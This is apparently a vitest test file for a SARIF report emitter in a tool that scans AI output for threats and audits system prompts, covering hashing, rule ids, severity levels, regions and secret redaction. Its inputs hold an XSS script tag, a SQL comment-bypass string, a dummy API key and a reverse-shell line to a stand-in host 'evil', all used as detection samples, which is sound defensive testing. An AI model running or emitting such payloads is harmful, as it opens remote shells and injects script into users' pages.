import { describe, it, expect } from 'vitest'
import { scanOutput } from '../src/output-scanner.js'
import { auditWithDetails } from '../src/scanner.js'
import {
  outputScanToSarif,
  auditToSarif,
  sha256Hex,
  draftRuleId,
} from '../src/sarif.js'

const HEX64 = /^[a-f0-9]{64}$/

// ─── helpers ──────────────────────────────────────────────────────────────

function outputSarif(text: string, opts = {}) {
  return outputScanToSarif(scanOutput(text), { scannedText: text, ...opts })
}

// ─── sha256Hex + draftRuleId units ──────────────────────────────────────────

describe('sha256Hex', () => {
  it('matches the known SHA-256 vector for the empty string', () => {
    expect(sha256Hex('')).toBe(
      'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    )
  })

  it('matches the known SHA-256 vector for "abc"', () => {
    expect(sha256Hex('abc')).toBe(
      'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad',
    )
  })

  it('is 64-char lowercase hex per the envelope', () => {
    expect(sha256Hex('anything')).toMatch(HEX64)
  })
})

describe('draftRuleId', () => {
  it('namespaces with the DRAFT-pda- prefix', () => {
    expect(draftRuleId('xss-script-tag')).toBe('DRAFT-pda-xss-script-tag')
  })
})

// ─── envelope structure (MUST fields) ───────────────────────────────────────

describe('SARIF envelope — MUST fields', () => {
  it('declares version 2.1.0 and a $schema', () => {
    const s = outputSarif('<script>alert(1)</script>')
    expect(s.version).toBe('2.1.0')
    expect(typeof s.$schema).toBe('string')
    expect(s.$schema.length).toBeGreaterThan(0)
  })

  it('carries executionSuccessful on every invocation', () => {
    const s = outputSarif('hello world')
    expect(s.runs[0].invocations).toHaveLength(1)
    expect(s.runs[0].invocations[0].executionSuccessful).toBe(true)
  })

  it('emits one artifact with a 64-char lowercase-hex sha-256 of the scanned text', () => {
    const text = 'Here is your greeting: <script>alert(1)</script>'
    const s = outputSarif(text)
    expect(s.runs[0].artifacts).toHaveLength(1)
    const hash = s.runs[0].artifacts[0].hashes['sha-256']
    expect(hash).toMatch(HEX64)
    expect(hash).toBe(sha256Hex(text))
  })

  it('carries startTimeUtc / endTimeUtc when provided (SHOULD)', () => {
    const s = outputSarif('x', {
      startTimeUtc: '2026-07-02T00:00:00.000Z',
      endTimeUtc: '2026-07-02T00:00:00.010Z',
    })
    expect(s.runs[0].invocations[0].startTimeUtc).toBe('2026-07-02T00:00:00.000Z')
    expect(s.runs[0].invocations[0].endTimeUtc).toBe('2026-07-02T00:00:00.010Z')
  })
})

// ─── results ⇄ rules referential integrity ──────────────────────────────────

describe('results reference declared rules', () => {
  it('every result.ruleId resolves to a rule in tool.driver.rules', () => {
    const s = outputSarif(
      '<script>alert(1)</script> and bash -i >& /dev/tcp/evil/4444 0>&1',
    )
    const run = s.runs[0]
    expect(run.results.length).toBeGreaterThan(0)
    const ruleIds = new Set(run.tool.driver.rules.map((r) => r.id))
    for (const res of run.results) {
      expect(ruleIds.has(res.ruleId)).toBe(true)
    }
  })

  it('ruleIndex points at the matching rule', () => {
    const s = outputSarif('<script>alert(1)</script>')
    const run = s.runs[0]
    for (const res of run.results) {
      expect(res.ruleIndex).toBeTypeOf('number')
      expect(run.tool.driver.rules[res.ruleIndex!].id).toBe(res.ruleId)
    }
  })

  it('rule ids use the DRAFT-pda- convention and carry the tracking issue', () => {
    const s = outputSarif('<script>alert(1)</script>')
    const rule = s.runs[0].tool.driver.rules[0]
    expect(rule.id.startsWith('DRAFT-pda-')).toBe(true)
    expect(rule.properties?.['tracking-issue']).toContain(
      'ppcvote/prompt-defense-audit/issues/1',
    )
    expect(rule.properties?.['draft-id']).toBe(rule.id)
  })
})

// ─── severity → level mapping ────────────────────────────────────────────────

describe('severity → SARIF level', () => {
  it('maps a critical threat to error', () => {
    const s = outputSarif('<script>alert(1)</script>')
    expect(s.runs[0].results[0].level).toBe('error')
  })

  it('maps a medium threat (sql comment bypass) to warning', () => {
    const s = outputSarif(`id=1";--`)
    const r = s.runs[0].results.find((x) => x.ruleId === draftRuleId('sqli-comment-bypass'))
    expect(r?.level).toBe('warning')
  })
})

// ─── region correctness ──────────────────────────────────────────────────────

describe('result region', () => {
  it('charOffset equals the scanner position; single-line stays on line 1', () => {
    const text = 'hello <script>alert(1)</script>'
    const scan = scanOutput(text)
    const threat = scan.threats.find((t) => t.id === 'xss-script-tag')!
    const s = outputScanToSarif(scan, { scannedText: text })
    const region = s.runs[0].results[0].locations![0].physicalLocation.region!
    expect(region.charOffset).toBe(threat.position)
    expect(region.startLine).toBe(1)
    expect(region.snippet?.text).toBe(threat.match)
  })

  it('computes the correct line for a payload on the second line', () => {
    const text = 'safe line\n<script>alert(1)</script>'
    const s = outputSarif(text)
    const region = s.runs[0].results[0].locations![0].physicalLocation.region!
    expect(region.startLine).toBe(2)
    expect(region.startColumn).toBe(1)
  })
})

// ─── failure path ────────────────────────────────────────────────────────────

describe('failed scan', () => {
  it('sets executionSuccessful false and emits a stderr notification', () => {
    const s = outputScanToSarif(scanOutput(''), {
      scannedText: '',
      executionSuccessful: false,
      error: { message: 'boom', standardError: 'Error: boom\n  at x' },
    })
    const inv = s.runs[0].invocations[0]
    expect(inv.executionSuccessful).toBe(false)
    expect(inv.toolExecutionNotifications).toHaveLength(1)
    expect(inv.toolExecutionNotifications![0].level).toBe('error')
    expect(inv.toolExecutionNotifications![0].properties?.standardError).toContain('boom')
  })
})

// ─── clean input still produces a valid envelope ─────────────────────────────

describe('clean output', () => {
  it('emits zero results but a valid envelope with a hashed artifact', () => {
    const s = outputSarif('Hello, how can I help you today?')
    expect(s.runs[0].results).toHaveLength(0)
    expect(s.runs[0].tool.driver.rules).toHaveLength(0)
    expect(s.runs[0].artifacts[0].hashes['sha-256']).toMatch(HEX64)
    expect(s.runs[0].invocations[0].executionSuccessful).toBe(true)
  })
})

// ─── column kind (post-review) ───────────────────────────────────────────────

describe('columnKind', () => {
  it('declares utf16CodeUnits so consumers do not assume code points', () => {
    const s = outputSarif('<script>alert(1)</script>')
    expect(s.runs[0].columnKind).toBe('utf16CodeUnits')
  })
})

// ─── secret redaction (post-review) ──────────────────────────────────────────

describe('credential findings are located but never reproduced', () => {
  const KEY = 'sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAA'

  it('emits a credential result whose region has no snippet', () => {
    const text = `Here is the key: ${KEY}`
    const s = outputSarif(text)
    const res = s.runs[0].results.find((r) => r.ruleId === draftRuleId('credential-api-key'))
    expect(res).toBeDefined()
    const region = res!.locations![0].physicalLocation.region!
    expect(region.snippet).toBeUndefined()
    // still precisely located
    expect(region.charOffset).toBeGreaterThan(0)
    expect(region.charLength).toBeGreaterThan(0)
  })

  it('never leaks the secret anywhere in the serialized SARIF', () => {
    const text = `token=${KEY} please rotate`
    const s = outputSarif(text)
    expect(JSON.stringify(s).includes(KEY)).toBe(false)
  })

  it('still reproduces snippets for non-secret rules', () => {
    const s = outputSarif('<script>alert(1)</script>')
    const region = s.runs[0].results[0].locations![0].physicalLocation.region!
    expect(region.snippet?.text).toContain('<script>')
  })
})

// ─── schema URI (post-review) ────────────────────────────────────────────────

describe('$schema', () => {
  it('points at the OASIS canonical SARIF 2.1.0 schema', () => {
    const s = outputSarif('x')
    expect(s.$schema).toBe(
      'https://docs.oasis-open.org/sarif/sarif/v2.1.0/errata01/os/schemas/sarif-schema-2.1.0.json',
    )
  })
})

// ─── prompt-audit emitter ────────────────────────────────────────────────────

describe('auditToSarif', () => {
  it('turns missing defenses into note-level results with no region', () => {
    const text = 'You are a helpful assistant.'
    const audit = auditWithDetails(text)
    const s = auditToSarif(audit, { scannedText: text })
    expect(s.version).toBe('2.1.0')
    expect(s.runs[0].results.length).toBeGreaterThan(0)
    for (const res of s.runs[0].results) {
      expect(res.level).toBe('note')
      expect(res.locations).toBeUndefined()
      expect(res.ruleId.startsWith('DRAFT-pda-missing-')).toBe(true)
    }
    // still one hashable artifact for the prompt itself
    expect(s.runs[0].artifacts[0].hashes['sha-256']).toBe(sha256Hex(text))
  })
})
